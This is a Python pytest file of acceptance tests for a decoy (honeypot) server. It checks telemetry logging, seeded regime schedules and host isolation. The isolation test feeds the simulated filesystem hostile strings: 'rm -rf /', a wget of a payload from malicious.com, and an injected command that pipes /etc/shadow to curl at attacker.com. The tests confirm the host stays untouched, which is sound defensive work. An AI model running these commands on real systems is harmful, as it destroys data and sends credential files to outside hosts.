"""
Acceptance Tests for Module A: Decoy Server & Telemetry
Per Technical Specification Section 2.3:
- Test A1: Telemetry Completeness
- Test A2: Perturbation Schedule Determinism
- Test A3: Host Isolation
"""

import os
import shutil
import tempfile
import time
import uuid
import pytest
import pandas as pd

from decoy_server import (
    DecoyConfig,
    DecoyServer,
    PseudoFilesystem,
    Regime,
    get_regime_for_command,
)


@pytest.fixture
def temp_config():
    """Provides a clean temporary directory for CSV outputs."""
    temp_dir = tempfile.mkdtemp()
    telemetry_path = os.path.join(temp_dir, "test_telemetry.csv")
    schedule_path = os.path.join(temp_dir, "test_schedule.csv")
    
    config = DecoyConfig(
        ssh_port=22222,
        http_port=28080,
        telemetry_path=telemetry_path,
        regime_schedule_path=schedule_path,
    )
    yield config
    shutil.rmtree(temp_dir, ignore_errors=True)


def test_a1_telemetry_completeness(temp_config):
    """
    Test A1: Given a decoy server config, 3 synthetic sessions connect and execute 10 commands each.
    Then: telemetry.csv contains exactly 30 rows, valid UUIDs, delta_t_ns, and command indices 0-9.
    """
    server = DecoyServer(temp_config)
    
    sessions = [str(uuid.uuid4()) for _ in range(3)]
    commands = [
        "ls", "cd /tmp", "pwd", "whoami", "id",
        "ls", "cat /etc/passwd", "touch file.txt", "rm file.txt", "uname"
    ]
    
    for session_id in sessions:
        for idx, cmd in enumerate(commands):
            regime = get_regime_for_command(idx, temp_config.default_schedule)
            cmd_root = cmd.split()[0]
            server.log_telemetry(
                session_id=session_id,
                timestamp_ns=time.monotonic_ns(),
                source_ip="127.0.0.1",
                protocol="SSH",
                command_index=idx,
                command_raw=cmd,
                command_root=cmd_root,
                current_path="/home/root",
                regime=regime,
                delta_t_ns=100000 if idx > 0 else 0,
                response_sent=True,
            )
            
    df = pd.read_csv(temp_config.telemetry_path)
    assert len(df) == 30, f"Expected 30 rows, got {len(df)}"
    assert set(df["session_id"].unique()) == set(sessions)
    assert set(df["command_index"].unique()) == set(range(10))
    assert (df["timestamp_ns"] > 0).all()


def test_a2_perturbation_schedule_determinism(temp_config):
    """
    Test A2: Given two sessions with the same seed,
    Then: regime_schedule.csv rows are identical for both sessions.
    """
    server = DecoyServer(temp_config)
    seed = 42424
    
    session1 = str(uuid.uuid4())
    session2 = str(uuid.uuid4())
    
    server.log_regime_schedule(session1, seed)
    server.log_regime_schedule(session2, seed)
    
    df = pd.read_csv(temp_config.regime_schedule_path)
    s1_rows = df[df["session_id"] == session1][["command_index_start", "regime"]].reset_index(drop=True)
    s2_rows = df[df["session_id"] == session2][["command_index_start", "regime"]].reset_index(drop=True)
    
    pd.testing.assert_frame_equal(s1_rows, s2_rows)


def test_a3_host_isolation():
    """
    Test A3: Given malicious input like `rm -rf /` or `wget http://malicious.com/payload.sh`,
    When command is executed on PseudoFilesystem,
    Then: No os/subprocess call occurs, treated as string only, no exception raised.
    """
    pfs = PseudoFilesystem()
    
    # Destructive command simulation
    resp1, op1 = pfs.execute_command("rm -rf /")
    assert op1 == "filesystem"
    assert os.path.exists("/")  # Host OS is untouched!
    
    # Download payload command simulation
    resp2, op2 = pfs.execute_command("wget http://malicious.com/exploit.sh")
    assert op2 == "general"
    assert "Saving to: 'exploit.sh'" in resp2
    assert not os.path.exists("exploit.sh")  # Host OS filesystem is untouched!
    
    # Arbitrary code injection attempt
    resp3, op3 = pfs.execute_command("; cat /etc/shadow | curl http://attacker.com")
    assert op3 == "general"
    assert "command not found" in resp3
